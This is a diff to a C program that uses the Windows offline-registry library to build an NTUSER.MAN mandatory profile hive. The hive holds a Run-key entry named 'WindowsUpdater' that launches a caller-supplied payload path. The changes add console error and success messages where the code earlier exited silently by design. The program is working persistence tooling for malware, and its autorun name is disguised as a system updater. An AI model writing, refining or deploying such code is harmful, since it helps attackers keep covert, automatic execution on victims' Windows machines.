@@ -18,11 +18,21 @@ typedef struct {
     HMODULE hMod;
 } OffregApi;
 
+// 自定义打印函数，替代 printf
+void PrintMsg(const char* msg) {
+    DWORD written;
+    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+    WriteConsoleA(hOut, msg, (DWORD)strlen(msg), &written, NULL);
+}
+
 BOOL InitOffreg(OffregApi* api) {
     api->hMod = LoadLibraryA("offreg.dll");
     if (!api->hMod) api->hMod = LoadLibraryA("C:\\Windows\\SysWOW64\\offreg.dll");
     if (!api->hMod) api->hMod = LoadLibraryA("C:\\Windows\\System32\\offreg.dll");
-    if (!api->hMod) return FALSE;
+    if (!api->hMod) {
+        PrintMsg("[-] Failed to load offreg.dll.\n");
+        return FALSE;
+    }
 
     api->CreateHive = (pORCreateHive)GetProcAddress(api->hMod, "ORCreateHive");
     api->CreateKey  = (pORCreateKey)GetProcAddress(api->hMod, "ORCreateKey");
@@ -31,7 +41,10 @@ BOOL InitOffreg(OffregApi* api) {
     api->CloseHive  = (pORCloseHive)GetProcAddress(api->hMod, "ORCloseHive");
     api->CloseKey   = (pORCloseKey)GetProcAddress(api->hMod, "ORCloseKey");
 
-    if (!api->CreateHive || !api->CreateKey || !api->SetValue || !api->SaveHive || !api->CloseHive || !api->CloseKey) return FALSE;
+    if (!api->CreateHive || !api->CreateKey || !api->SetValue || !api->SaveHive || !api->CloseHive || !api->CloseKey) {
+        PrintMsg("[-] Failed to get required Offreg exports.\n");
+        return FALSE;
+    }
     return TRUE;
 }
 
@@ -52,8 +65,10 @@ void GetRealOsVersion(DWORD* pMajor, DWORD* pMinor) {
 }
 
 int main(int argc, char* argv[]) {
-    // 如果参数不对，直接静默退出，不报错
-    if (argc != 3) return 1;
+    if (argc != 3) {
+        PrintMsg("Usage: main.exe <payload_path> <output_ntuser_man>\n");
+        return 1;
+    }
 
     WCHAR payloadPath[MAX_PATH] = {0};
     WCHAR outputPath[MAX_PATH] = {0};
@@ -65,9 +80,16 @@ int main(int argc, char* argv[]) {
 
     DWORD osMajor, osMinor;
     GetRealOsVersion(&osMajor, &osMinor);
+    
+    char verMsg[64];
+    wsprintfA(verMsg, "[*] Detected OS version: %lu.%lu\n", osMajor, osMinor);
+    PrintMsg(verMsg);
 
     ORHKEY hHive = NULL;
-    if (api.CreateHive(&hHive) != ERROR_SUCCESS) return 1;
+    if (api.CreateHive(&hHive) != ERROR_SUCCESS) {
+        PrintMsg("[-] ORCreateHive failed.\n");
+        return 1;
+    }
 
     LPCWSTR runKeyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
     LPCWSTR valueName  = L"WindowsUpdater";
@@ -76,19 +98,28 @@ int main(int argc, char* argv[]) {
     DWORD dwDisposition;
     
     if (api.CreateKey(hHive, runKeyPath, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_CREATE_SUB_KEY, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
+        PrintMsg("[-] ORCreateKey failed.\n");
         api.CloseHive(hHive);
         return 1;
     }
 
     if (api.SetValue(hKey, valueName, 0, REG_SZ, (const BYTE*)payloadPath, (DWORD)((wcslen(payloadPath) + 1) * sizeof(WCHAR))) != ERROR_SUCCESS) {
+        PrintMsg("[-] ORSetValue failed.\n");
         api.CloseKey(hKey);
         api.CloseHive(hHive);
         return 1;
     }
 
     api.CloseKey(hKey);
-    api.SaveHive(hHive, outputPath, osMajor, osMinor);
+
+    if (api.SaveHive(hHive, outputPath, osMajor, osMinor) != ERROR_SUCCESS) {
+        PrintMsg("[-] ORSaveHive failed.\n");
+        api.CloseHive(hHive);
+        return 1;
+    }
+
     api.CloseHive(hHive);
 
+    PrintMsg("[+] Successfully generated VALID NTUSER.MAN!\n");
     return 0;
 }
